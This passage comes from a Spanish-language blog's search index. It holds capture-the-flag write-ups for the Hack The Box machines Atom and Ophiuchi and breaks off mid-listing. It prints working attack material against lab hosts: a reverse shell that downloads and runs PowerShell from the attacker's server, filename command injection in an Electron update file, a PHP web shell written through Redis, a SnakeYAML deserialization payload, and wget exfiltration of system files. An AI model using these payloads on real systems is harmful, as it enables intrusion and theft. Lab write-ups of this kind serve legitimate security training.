v’ulnerable-app-setup-1.2.3.exe con una comilla simple se ejecutaría, por otro lado para ejecutar comandos se utilizan comillas dobles v';calc;'ulnerable-app-setup-1.2.3.exe.\n1 2 3 4 5 6 7 8 9 #latest.yml version: 1.2.3 files: - url: v\u0026#39;;calc;\u0026#39;ulnerable-app-setup-1.2.3.exe sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA== size: 44653912 path: v\u0026#39;;calc;\u0026#39;ulnerable-app-1.2.3.exe sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA== releaseDate: \u0026#39;2019-11-20T11:17:02.627Z\u0026#39; Despues de realizar diferentes modificaciones al archivo latest.yml logramos ejecutar nuestra shell cambiando el nombre del archivo.\nyaml\rbash\r1 2 3 4 5 6 7 8 version: 6.1.0 files: - url: http://10.10.14.18/pay\u0026#39;load.exe sha512: 0wdfkI8aLN9XrsK/JpYCtxTnvnPi3+ezGGIU72KpGCzEaANmsQh7/ohmRNDHFyxnr/OIqWLa6wqr72l1rMd3xg== size: 73802 path: pay\u0026#39;load.exe sha512: 0wdfkI8aLN9XrsK/JpYCtxTnvnPi3+ezGGIU72KpGCzEaANmsQh7/ohmRNDHFyxnr/OIqWLa6wqr72l1rMd3xg== releaseDate: \u0026#39;2021-05-05T11:17:02.627Z\u0026#39; 1 2 3 4 5 6 7 8 # Reverse shell echo \u0026#34;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 1338\u0026#34; \u0026gt;\u0026gt; nishang.ps1 # EXE msfvenom -a x86 --platform Windows -p windows/exec CMD=\u0026#34;powershell \\\u0026#34;IEX(New-Object Net.webClient).downloadString(\u0026#39;http://10.10.14.18/nishang.ps1\u0026#39;)\\\u0026#34;\u0026#34; -f exe -o payload.exe # SHA512 shasum -a 512 \u0026#34;pay\u0026#39;load.exe\u0026#34; | cut -d \u0026#34; \u0026#34; -f1 | xxd -r -p | base64 | tr -d \u0026#34;$\\n\u0026#34; mv payload.exe \u0026#34;pay\u0026#39;load.exe\u0026#34; python3 -m http.server 80 Para ejecutar comandos se agregan al nombre del archivo.\n1 # mv payload.exe \u0026#34;pay\u0026#39;;nslookup test.local 10.10.14.18;\u0026#39;load.exe\u0026#34; Obtuvimos nuestra shell con el usuario Jason y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 λ ~/htb/atom nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.18] from atom.htb [10.10.10.237] 61151 Windows PowerShell running as user jason on ATOM Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\WINDOWS\\system32\u0026gt;whoami atom\\jason PS C:\\WINDOWS\\system32\u0026gt; type C:\\Users\\jason\\Desktop\\user.txt 13b9e357b45b1e0b0ff69bb4a5ee573c PS C:\\WINDOWS\\system32\u0026gt; PRIVILEGE ESCALATION PORTABLE KANBAN Enumerando las carpetas del usuario Jason encontramos PortableKanban, en el archivo de configuracion PortableKanban.cfg encontramos una contraseña encriptada.\n1 2 3 PS C:\\Users\\Jason\\Downloads\\portablekanban\u0026gt; cat C:\\Users\\Jason\\Downloads\\portablekanban\\PortableKanban.cfg {\u0026#34;RoamingSettings\u0026#34;:{\u0026#34;DataSource\u0026#34;:\u0026#34;RedisServer\u0026#34;,\u0026#34;DbServer\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;DbPort\u0026#34;:6379,\u0026#34;DbEncPassword\u0026#34;:\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34;,\u0026#34;DbServer2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbPort2\u0026#34;:6379,\u0026#34;DbEncPassword2\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;DbIndex\u0026#34;:0,\u0026#34;DbSsl\u0026#34;:false,[... REDACTED ... ]} PS C:\\Users\\Jason\\Downloads\\portablekanban\u0026gt; Además encontramos un exploit con el cual logramos obtener en texto plano la contraseña.\n1 2 3 4 5 6 7 8 9 10 # Exploit Title: PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval import base64 from des import * #python3 -m pip install des def decode(hash): hash = base64.b64decode(hash.encode(\u0026#39;utf-8\u0026#39;)) key = DesKey(b\u0026#34;7ly6UznJ\u0026#34;) return key.decrypt(hash,initial=b\u0026#34;XuVUm5fR\u0026#34;,padding=True).decode(\u0026#39;utf-8\u0026#39;) print(decode(\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34;)) # kidvscat_yes_kidvscat REDIS Utilizamos la contraseña con redis-cli ya que existe el puerto 6379 abierto, encontramos una contraseña encriptada en una de las KEYS del \u0026ldquo;usuario\u0026rdquo; Administrator, utilizamos nuevamente el exploit para obtener en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 λ ~/htb/atom/wwww redis-cli -h 10.10.10.237 -a \u0026#34;kidvscat_yes_kidvscat\u0026#34; Warning: Using a password with \u0026#39;-a\u0026#39; or \u0026#39;-u\u0026#39; option on the command line interface may not be safe. 10.10.10.237:6379\u0026gt; ping PONG 10.10.10.237:6379\u0026gt; keys * 1) \u0026#34;pk:ids:MetaDataClass\u0026#34; 2) \u0026#34;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0\u0026#34; 3) \u0026#34;pk:ids:User\u0026#34; 4) \u0026#34;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff\u0026#34; 10.10.10.237:6379\u0026gt; get pk:ids:MetaDataClass (error) WRONGTYPE Operation against a key holding the wrong kind of value 10.10.10.237:6379\u0026gt; get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 \u0026#34;{\\\u0026#34;Id\\\u0026#34;:\\\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\\\u0026#34;,\\\u0026#34;Name\\\u0026#34;:\\\u0026#34;Administrator\\\u0026#34;,\\\u0026#34;Initials\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;Email\\\u0026#34;:\\\u0026#34;\\\u0026#34;,\\\u0026#34;EncryptedPassword\\\u0026#34;:\\\u0026#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\\u0026#34;,\\\u0026#34;Role\\\u0026#34;:\\\u0026#34;Admin\\\u0026#34;,\\\u0026#34;Inactive\\\u0026#34;:false,\\\u0026#34;TimeStamp\\\u0026#34;:637530169606440253}\u0026#34; 10.10.10.237:6379\u0026gt; get pk:ids:User (error) WRONGTYPE Operation against a key holding the wrong kind of value 10.10.10.237:6379\u0026gt; get pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff \u0026#34;{\\\u0026#34;Id\\\u0026#34;:\\\u0026#34;ffffffffffffffffffffffffffffffff\\\u0026#34;,\\\u0026#34;SchemaVersion\\\u0026#34;:\\\u0026#34;4.2.0.0\\\u0026#34;,\\\u0026#34;SchemaVersionModified\\\u0026#34;:\\\u0026#34;\\\\/Date(1617420120000-0700)\\\\/\\\u0026#34;,\\\u0026#34;SchemaVersionModifiedBy\\\u0026#34;:\\\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\\\u0026#34;,\\\u0026#34;SchemaVersionChecked\\\u0026#34;:\\\u0026#34;\\\\/Date(-62135596800000-0000)\\\\/\\\u0026#34;,\\\u0026#34;SchemaVersionCheckedBy\\\u0026#34;:\\\u0026#34;00000000000000000000000000000000\\\u0026#34;,\\\u0026#34;TimeStamp\\\u0026#34;:637530169345346438}\u0026#34; (0.54s) 10.10.10.237:6379\u0026gt; Verificamos con crackmapexec, vemos que es la contraseña de Administrator y tenemos acceso completo.\n1 2 3 4 5 6 7 8 9 10 11 λ ~/htb/atom/wwww cme smb -u Administrator -p \u0026#34;kidvscat_admin_@123\u0026#34; --shares 10.10.10.237 SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\Administrator:kidvscat_admin_@123 (Pwn3d!) SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ READ,WRITE Remote Admin SMB 10.10.10.237 445 ATOM C$ READ,WRITE Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE λ ~/htb/atom/wwww WINRM Por alguna razon el puerto de winrm no apareció en nmap, utilizamos este ultimo puerto para obtener una shell y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 λ ~/htb/atom/wwww evil-winrm -i 10.10.10.237 -u Administrator -p \u0026#34;kidvscat_admin_@123\u0026#34; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; whoami atom\\administrator *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 5/6/2021 4:43 PM 34 root.txt *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt 50448bb96c0c36cbc2b89e9bebff9588 *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; REDIS TO ROOT Tambien mediante Redis logramos ejecutar comandos, modificando la configuracion de redis para escribir una web shell, similar a Postman - HTB.\n1 2 3 4 5 6 7 8 9 λ ~/htb/atom redis-cli -h 10.10.10.237 -a \u0026#34;kidvscat_yes_kidvscat\u0026#34; Warning: Using a password with \u0026#39;-a\u0026#39; or \u0026#39;-u\u0026#39; option on the command line interface may not be safe. 10.10.10.237:6379\u0026gt; config set dbfilename redis.php OK 10.10.10.237:6379\u0026gt; set test \u0026#34;\u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt;\u0026#34; OK 10.10.10.237:6379\u0026gt; save OK 10.10.10.237:6379\u0026gt; Tambien encontramos las KEYS en nuestra webshell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 λ ~/htb/atom/wwww curl -sX GET \u0026#34;http://atom.htb/redis.php?cmd=whoami%20/all\u0026#34; -o out.txt; cat out.txt REDIS0006 pk:ids:User$e8e29158-d70d-44b1-a1ba-4949d52790a0�9pk:urn:metadataclass:f-@�ff��J{\u0026#34;Id\u0026#34;:\u0026#34;f�\u0026#34;,\u0026#34;SchemaVersion 24.2.0.0�Modifie@T\\/Date(1617420120 -0700)\\/�6By Ze8e29158d70d44b1a1ba4949d52790a�sCheck�r -621355968 r@t � t7`s !� TimeStamp\u0026#34;:637530169345346438}test$ USER INFORMATION ---------------- User Name SID =================== ======== nt authority\\system S-1-5-18 GROUP INFORMATION ----------------- Group Name Type SID Attributes ====================================== ================ ============ ================================================== BUILTIN\\Administrators Alias S-1-5-32-544 Enabled by default, Enabled group, Group owner Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group Mandatory Label\\System Mandatory Level Label S-1-16-16384 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeLockMemoryPrivilege Lock pages in memory Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeTcbPrivilege Act as part of the operating system Enabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeCreatePermanentPrivilege Create permanent shared objects Enabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Enabled SeAuditPrivilege Generate security audits Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 52790a0\u0026#34;,\u0026#34;Name )29158-d70d-44b1-a1ba-4949d52790a0���{\u0026#34;Id\u0026#34;:\u0026#34;e8e29158d70d44b1a1ba4949d Email Administrator Initials ncryptedPasswor@fOdh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi ARol�f Inactiv f de,\u0026#34;TimeStamp\u0026#34;:637530169606440253}pk:ids:MetaDataClass�$ff-@�ffs-key$ [ ... REDACTED ... ] � λ ~/htb/atom/wwww REDIS PROCESS Con la shell que obtuvimos con WINRM encontramos que redis-server esta siendo ejecutado por el administrador y es por eso que logramos ejecutar comandos privilegiados en REDIS TO ROOT.\n1 2 3 4 5 *Evil-WinRM* PS C:\\xampp\\htdocs\u0026gt; Get-Process -Name redis-server -IncludeUserName Handles WS(K) CPU(s) Id UserName ProcessName ------- ----- ------ -- -------- ----------- 126 20628 0.61 7712 NT AUTHORITY\\NETWOR... redis-server ","description":"Atom presenta una aplicacion Electron. Explotamos una vulnerabilidad en un modulo de actualizacion que permitio ejecutar comandos a través de un archivo de actualizacion y acceso al servidor de actualizaciones. Obtuvimos credenciales a través de Portable Kanban lo que nos dio acceso a Redis donde encontramos la contraseña del administrador. Tambien, por medio de Redis escribimos una web shell que nos dio acceso privilegiado.","id":57,"section":"posts","tags":["electron","npm","npx","yaml","rce","portable kanban","redis","winrm"],"title":"Hack The Box - Atom","uri":"https://sckull.github.io/posts/atom/"},{"content":"\rOphiuchi presenta una vulnerabilidad de deserializacion en java en YAML con la cual se obtuvieron credenciales de tomcat y acceso a la maquina. Mediante el analisis de un archivo en Go se creó un archivo WebAssembly para ejecutar un script en bash el cual proporciona permisos sobre bash para finalmente obtener acceso como root.\nNombre Ophiuchi OS Linux Puntos 30 Dificultad Media IP 10.10.10.227 Maker felamos\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[4.8, 5, 5.2, 4.8, 5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (8080) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.91 scan initiated Fri Apr 2 02:24:15 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.227 Warning: 10.10.10.227 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.089s latency). Not shown: 44312 closed ports, 21221 filtered ports PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy # Nmap done at Fri Apr 2 02:25:19 2021 -- 1 IP address (1 host up) scanned in 63.77 seconds # Nmap 7.91 scan initiated Fri Apr 2 02:26:02 2021 as: nmap -p 22,8080 -sV -sC -oN servicesports 10.10.10.227 Nmap scan report for 10.10.10.227 (10.10.10.227) Host is up (0.065s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA) | 256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA) |_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519) 8080/tcp open http Apache Tomcat 9.0.38 |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 2 02:26:12 2021 -- 1 IP address (1 host up) scanned in 10.10 seconds HTTP Encontramos una pagina web en el puerto 8080 en la cual es posible parsear sintaxis YAML, aunque al enviar una sintaxis se muestra un mensaje el cual indica que ha sido removida esta funcionalidad.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ gobuster dir -u http://10.10.10.227:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t 50 /test (Status: 302) /manager (Status: 302) /yaml (Status: 302) TOMCAT En las direcciones encontradas vemos el panel de login basico de TOMCAT.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 HTTP/1.1 401 Cache-Control: private Expires: Thu, 01 Jan 1970 00:00:00 GMT WWW-Authenticate: Basic realm=\u0026#34;Tomcat Manager Application\u0026#34; Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2499 Date: Sat, 03 Apr 2021 06:08:57 GMT \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; \u0026lt;!-- BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;font-size:12px;} H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} PRE, TT {border: 1px dotted #525D76} A {color : black;}A.name {color : black;} --\u0026gt; \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;401 Unauthorized\u0026lt;/h1\u0026gt; Además logramos obtener la version realizando una solicitud a una direccion falsa.\n1 2 3 ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ curl -s http://10.10.10.227:8080/batman |html2text|grep \u0026#34;Tomcat\u0026#34; **** Apache Tomcat/9.0.38 **** SNAKEYAML DESERIALIZATION Volviendo a la pagina inicial, realizamos una busqueda de vulnerabilidades relacionadas a YAML en lenguaje Java. Encontramos una vulnerabilidad relacionada a la libreria snakeyaml en donde obtiene un payload el cual carga codigo para realizar una solicitud a la direccion dada, mediante ScriptEngineManager, en esta solicitud espera que el archivo o clase (.class) javax.script.ScriptEngineFactory exista en la direccion dada, dicha clase es cargada y ejecutada.\nUtilizando un PoC que encontramos en Github modificamos AwesomeScriptEngineFactory.java en donde agregamos el comando ping hacia nuestra maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package sckull; import javax.script.ScriptEngine; import javax.script.ScriptEngineFactory; import java.io.IOException; import java.util.List; public class AwesomeScriptEngineFactory implements ScriptEngineFactory { public AwesomeScriptEngineFactory() { try { Runtime.getRuntime().exec(\u0026#34; ping -c 1 10.10.14.17 \u0026#34;); } catch (IOException e) { e.printStackTrace(); } } [... REDACTED ...] } Compilamos el codigo, además creamos un pequeño servidor de python en la carpeta src del repositorio, enviamos nuestro payload con nuestra direccion IP.\n1 2 javac src/sckull/AwesomeScriptEngineFactory.java \u0026amp;\u0026amp; jar -cvf yaml-payload.jar -C src/ . # python3 -m http.server 80 1 2 3 4 5 !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\u0026#34;http://10.10.14.17/\u0026#34;] ]] ] Logramos obtener una solicitud utilizando tcpdump.\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/htb/ophiuchi/yaml-payload] └─$ sudo tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 02:37:56.412303 IP 10.10.10.227 \u0026gt; 10.10.14.17: ICMP echo request, id 3, seq 1, length 64 02:37:56.412310 IP 10.10.14.17 \u0026gt; 10.10.10.227: ICMP echo reply, id 3, seq 1, length 64 Intentamos ejecutar diferentes comandos para shell inversa pero ninguno funció. Utilizamos wget para enumerar la maquina con diferentes archivos del sistem,a incialmente con /etc/passwd.\n1 Runtime.getRuntime().exec(\u0026#34;wget --post-file /etc/passwd http://10.10.14.17:1338/\u0026#34;); Con netcat a la escucha logramos obtener el archivo /etc/passwd, donde observamos algo interesante, el usuario tomcat tiene su directorio principal en /opt/tomcat.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ nc -l -p 1338 POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 10.10.14.17:1338 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 1798 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:1001:1001::/opt/tomcat:/bin/false admin:x:1000:1000:,,,:/home/admin:/bin/bash TOMCAT-USERS Sabiendo esto probablemente el directorio de instalacion de Apache Tomcat esté en /opt/tomcat y al igual que la maquina TABBY - HTB podriamos obtener el archivo tomcat-users.xml donde se encuentran las credenciales de acceso al panel de tomcat. Descargamos la misma version v9.0.38 de Tomcat para verificar el directorio donde se encuentra el archivo. El archivo lo encontramos en conf/, realizamos la solicitud de este archivo el cual logramos encontrar en /opt/tomcat/conf/tomcat-users.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ nc -l -p 1338 POST / HTTP/1.1 User-Agent: Wget/1.20.3 (linux-gnu) Accept: */* Accept-Encoding: identity Host: 10.10.14.17:1338 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 2234 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; [... REDACTED ...] \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;whythereisalimit\u0026#34; roles=\u0026#34;manager-gui,admin-gui\u0026#34;/\u0026gt; [... REDACTED ...] \u0026lt;!-- \u0026lt;role rolename=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;both\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat,role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;role1\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;role1\u0026#34;/\u0026gt; --\u0026gt; \u0026lt;/tomcat-users\u0026gt; ADMIN - USER Utilizamos las credenciales para obtener acceso al panel de tomcat, aunque, utilizando estas en el servicio SSH logramos obtener una shell y nuestra flag user.txt .\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/htb/ophiuchi] └─$ ssh admin@10.10.10.227 # whythereisalimit admin@10.10.10.227\u0026#39;s password: [... REDACTED ...] admin@ophiuchi:~$ whoami;id;pwd admin uid=1000(admin) gid=1000(admin) groups=1000(admin) /home/admin admin@ophiuchi:~$ cat user.txt | cut -c1-15 71c0901a2150cf8 admin@ophiuchi:~$ PRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el comando /usr/bin/go run /opt/wasm-functions/index.go.\nRevisamos el codigo fuente de index.go, vemos que realiza la lectura de un archivo wasm utilizando la libreria wasmer, crea una nueva instancia y exporta la funcion info la cual ejecuta, finalmente verifica que el string de esta funcion ejecutada sea valor 1, si esto no se cumple imprime el mensaje Not ready to deploy, en caso contrario realiza la ejecucion de un script llamado deploy.sh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; wasm \u0026#34;github.com/wasmerio/wasmer-go/wasmer\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;log\u0026#34; ) func main() { bytes, _ := wasm.ReadBytes(\u0026#34;main.wasm\u0026#34;) instance, _ := wasm.NewInstance(bytes) defer instance.Close() init := instance.Exports[\u0026#34;info\u0026#34;] result,_ := init() f := result.String() if (f != \u0026#34;1\u0026#34;) { fmt.Println(\u0026#34;Not ready to deploy\u0026#34;) } else { fmt.Println(\u0026#34;Ready to deploy\u0026#34;) out, err := exec.Command(\u0026#34;/bin/sh\u0026#34;, \u0026#34;deploy.sh\u0026#34;).Output() if err != nil { log.Fatal(err) } fmt.Println(string(out)) } } Dentro de la carpeta /opt/wasm-functions/ encontramos los archivos utilizados en index.go.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 admin@ophiuchi:~$ ls -lah /opt/wasm-functions/ total 3.9M drwxr-xr-x 3 root root 4.0K Oct 14 19:52 . drwxr-xr-x 5 root root 4.0K Oct 14 